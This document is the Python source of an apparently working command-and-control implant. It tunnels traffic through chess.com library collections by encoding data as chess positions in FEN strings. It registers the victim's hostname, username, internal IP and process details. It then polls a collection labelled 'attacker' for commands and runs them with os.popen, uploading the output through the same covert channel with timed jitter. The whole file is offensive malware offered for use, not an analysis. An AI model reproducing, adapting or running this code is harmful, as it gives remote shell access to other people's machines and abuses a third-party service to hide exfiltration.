import requests
import json
import socket
import time
import os
import sys
import random
import string
import platform
import base64
import math
from typing import List
from pathlib import Path

from dotenv import load_dotenv

BASE_DIR = Path(__file__).resolve().parents[1]
load_dotenv(BASE_DIR / ".env")

url = "http://127.0.0.1/test"
magic = b"\x41\x41\x41\x41"
agentid = 234234  # this values is changed later with a random one
user_agent = (
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
)

WAIT_TIME = 4
JITTER = 2

MY_COLLECTION = os.getenv("AGENT_MY_COLLECTION_ID", "3186ea38-1cc5-11f1-a1c5-ad1d0ff2ef4e")
PARTNER_COLLECTION = os.getenv("AGENT_PARTNER_COLLECTION_ID", "e6af2a10-1801-11f1-911e-05aff8b4a5dd")

CHESS_COM_COOKIE = os.getenv("AGENT_CHESS_COM_COOKIE", "")
CHESS_UPLOAD_TOKEN = os.getenv("AGENT_UPLOAD_TOKEN", "")
CHESS_CLEAR_TOKEN = os.getenv("AGENT_CLEAR_TOKEN", "")

class Base5Chess:
    ALPHABET = 'PNBRQ'

    def encode(data: bytes) -> str:
        if not data:
            return ''
        # Bytes to big integer
        num = int.from_bytes(data, 'big')
        if num == 0:
            return 'P'  # 0 -> P
        encoded = []
        while num > 0:
            encoded.append(Base5Chess.ALPHABET[num % 5])
            num //= 5
        return ''.join(reversed(encoded))

    def decode(encoded: str) -> bytes:
        if not encoded:
            return b''
        # Base5 string to integer
        num = 0
        for char in encoded:
            num = num * 5 + Base5Chess.ALPHABET.index(char)
        # Back to bytes (trim to exact byte length)
        byte_len = (num.bit_length() + 7) // 8
        return num.to_bytes(byte_len, 'big')

    def stringToFEN(encoded):
        chunks = [encoded[i:i+8] for i in range(0, len(encoded), 8)]
        games = []
        fen_template = ["7k","8","8","8","8","8","8","7K"," w - - 0 1"]
        fen_data = []
        i = 0
        for c in chunks:
            if len(fen_data) < 6:
                if i <= 2:
                    fen_data.append(c.lower())
                else:
                    fen_data.append(c.upper())
            else:
                for f in fen_data:
                    if len(f) < 8:
                        f = f + str(8-len(f))
                games.append([fen_template[0]]+fen_data+[fen_template[7], fen_template[8]])
                fen_data = []
                if c != "":
                    fen_data.append(c.lower())
                    i = 1
                    continue
                else:
                    break
            i += 1
        
        if fen_data != []:
            for i,f in enumerate(fen_data):
                if len(f) < 8:
                    fen_data[i] = f + str(8-len(f))
            games.append([fen_template[0]]+fen_data+(6-len(fen_data))*['8']+[fen_template[7], fen_template[8]])
        res = []
        for g in games:
            res.append(str('/'.join(g[0:8])+str(g[8])))
        return res
    
    def FENToString(fen: str) -> str:
        data = fen.split("/")
        return ''.join(data[1:7])

def uploadGames(games):
    headers = {
        "Host": "www.chess.com",
        "Cookie": CHESS_COM_COOKIE,
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://www.chess.com",
        "Referer": "https://www.chess.com/analysis",
        "User-Agent": "Mozilla/5.0",
    }
    pgn_string = ""
    pgn_template = ("[Event \"?\"]\n[Site \"?\"]\n[Date \"????.??.??\"]\n[Round \"?\"]\n[White \"?\"]\n[Black \"?\"]\n[Result \"*\"]\n[SetUp \"1\"]\n[FEN \"{fen}\"]\n\n*")
    for fen in games:
        pgn_string = pgn_string + "\n\n" + pgn_template.format(fen=fen)
    sent = False
    sleep_time = 2
    while not sent:
        try:
            data = {
                "_token": CHESS_UPLOAD_TOKEN,
                "pgn": pgn_string,
            }
            response = requests.post("https://www.chess.com/callback/library/collections/"+MY_COLLECTION+"/actions/add-from-pgn", headers=headers, json=data)
            response.raise_for_status()
            sent = True
            sleep_time = 2
        except Exception as e:
            time.sleep(sleep_time)
            sleep_time = sleep_time + 2
            print(f"Error uploading game {fen}: {e}")
    return

def clearGames():
    print('Clearing games...')
    games = getGames("mine")
    for i in range(0, math.ceil(len(games)/100)):
        try:
            ids, fens = zip(*games)
        except:
            return

        url = "https://www.chess.com/callback/library/collections/"+MY_COLLECTION+"/actions/remove-items"

        headers = {
            "Host": "www.chess.com",
            "Cookie": CHESS_COM_COOKIE,
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://www.chess.com",
            "User-Agent": "Mozilla/5.0",
        }


        data = {
            "_token": CHESS_CLEAR_TOKEN,
            "itemIds": list(ids),
        }

        response = requests.post(url, headers=headers, json=data)
        response.raise_for_status()
    return

def getGames(whos):
    if whos == "mine":
        url = "https://www.chess.com/callback/library/collections/"+MY_COLLECTION+"/items"
    else:
        # Attacker Collection
        url = "https://www.chess.com/callback/library/collections/"+PARTNER_COLLECTION+"/items"
    params = {
        "page": "1",
        "itemsPerPage": "10000",
        "gameSort": "1",
        "gamePlayer1": "",
    }
    headers = {
        "Host": "www.chess.com",
    }

    response = requests.get(
        url,
        params=params,
        headers=headers,
    )

    response.raise_for_status()
    payload = response.json()

    games: List[List[str]] = []

    for item in payload.get("data", []):
        game_id = item.get("id")
        fen = (
            item.get("typeSpecificData", {})
            .get("shareData", {})
            .get("pgnHeaders", {})
            .get("FEN")
        )
        if game_id and fen:
            if game_id != '1acdf52c-1df4-11f1-87b9-b143e701000d' and game_id != 'e0335fb2-1e19-11f1-88eb-c276b801000d':
                games.append([game_id, fen])

    return games

def uploadData(data):
    time.sleep(WAIT_TIME + random.uniform(0, JITTER))
    clearGames()
    print('Uploading data...')
    encoded = Base5Chess.encode(data)
    games = Base5Chess.stringToFEN(encoded)
    games = ["7k/8/8/8/8/8/8/7K w - - 0 1"]+games
    print("Number of games: "+str(len(games)))
    chunks = [games[i:i + 100] for i in range(0, len(games), 100)]
    for c in chunks[::-1]:
        uploadGames(c)
        time.sleep(WAIT_TIME + random.uniform(0, JITTER))
    return

def downloadData():
    time.sleep(1)
    print('Downloading data...')
    games = getGames("attacker")
    out = ''
    print(str(games)+"\n")
    while len(games) < 1:
        games = getGames("attacker")
        time.sleep(3)
    while games[0][1] != '7k/8/8/8/8/8/8/7K w - - 0 1':
        time.sleep(3)
    for game in games:
        data = Base5Chess.FENToString(game[1])
        out = out+data
    b5 = ''.join(char for char in out.upper() if not char.isdigit())

    b64 = Base5Chess.decode(b5)
    try:
        b64 = b64.decode('utf-8')
    except:
        return ""
    return b64

def get_random_string(length):
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def checkin(data):
    print("[+] Checking in for taskings: "+str(data))
    requestdict = {"task": "gettask", "data": data}
    requestblob = json.dumps(requestdict).encode('utf-8')
    size = len(requestblob) + 12
    size_bytes = size.to_bytes(4, 'big')
    agentid_bytes = agentid.ljust(4, b'\x00')[:4]
    agentheader = size_bytes + magic + agentid_bytes
    
    sendData(agentheader + requestblob)

    task = getData()

    return task

def sendData(data):
    # Encode and upload data to Chess.com
    print("[+] Sending data: "+str(base64.b64encode(data).decode('utf-8')))
    uploadData(base64.b64encode(data))
    print("[+] Sent data")
    return

def getData():
    # Download and decode data from Chess.com
    print("[+] Downloading data")
    res = downloadData()
    print("[+] Got data: "+str(base64.b64decode(res).decode('utf-8')))
    return base64.b64decode(res).decode('utf-8')

def register():
    hostname = socket.gethostname()
    registerdict = {
        "AgentID": agentid.decode('utf-8'),
        "Hostname": hostname,
        "Username": os.getlogin(),
        "Domain": "",
        "InternalIP": socket.gethostbyname(hostname),
        "Process Path": os.getcwd(),
        "Process ID": str(os.getpid()),
        "Process Parent ID": "0",
        "Process Arch": "x64",
        "Process Elevated": 0,
        "OS Build": "None",
        "Sleep": 1,
        "Process Name": "python",
        "OS Version": "0.0.0.0"
    }
    
    # JSON → bytes
    registerblob = json.dumps(registerdict).encode('utf-8')
    requestdict = {"task": "register", "data": registerblob.decode('utf-8')}  # data as str
    requestblob = json.dumps(requestdict).encode('utf-8')
    
    # EXACTLY 12-byte header: 4(size) + 4(magic) + 4(AgentID)
    size = len(requestblob) + 12
    size_bytes = size.to_bytes(4, 'big')
    agentid_bytes = agentid.ljust(4, b'\x00')[:4]  # Pad/truncate to exactly 4 bytes
    agentheader = size_bytes + magic + agentid_bytes
    
    print(f"[?] Register header: {agentheader.hex()}")
    print(f"[?] Register size: {size}")

    sendData(agentheader + requestblob)

    time.sleep(5)

    res = getData()
    return res

def runcommand(command):
    print("[+] Running command: "+str(command))
    command = command.strip("\x00")
    if command == "goodbye":
        sys.exit(2)
    output = os.popen(command).read() + "\n"
    return output

def main():
    global agentid
    agentid = get_random_string(4).encode('utf-8')
    agentheader = magic + agentid
    sleeptime = 5
    registered = ""
    outputdata = ""

    clearGames()

    #register the agent
    while registered != "registered":
        time.sleep(5)
        registered = register()
    print("REGISTERED!")

    #checkin for commands
    while True:
        commands = checkin(outputdata)
        outputdata = ""
        if len(commands) >= 4:
            try:
                # Extract commands after header
                commands_data = commands[4:]  # Skip 12-byte header
                print("[+] Commands data: "+str(commands_data))
                # Process commands (your existing logic)
                outputdata = runcommand(commands_data).strip("\n")
            except Exception as e:
                print("[+] Error: "+str(e))
        time.sleep(sleeptime)

if __name__ == "__main__":
    main()